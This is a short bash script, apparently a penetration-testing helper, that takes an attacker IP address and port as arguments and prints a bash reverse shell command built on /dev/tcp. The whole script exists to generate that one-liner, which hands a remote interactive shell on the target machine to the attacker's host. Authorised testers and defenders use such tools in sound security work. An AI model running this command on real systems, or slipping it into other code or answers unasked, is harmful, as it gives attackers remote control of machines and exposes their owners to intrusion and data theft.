#!/usr/bin/env bash
# Print a bash reverse shell command
set -euo pipefail

usage() {
    echo "Usage: $0 <attacker_ip> <port>"
}

if [[ $# -ne 2 ]]; then
    usage
    exit 1
fi

IP="$1"
PORT="$2"

echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
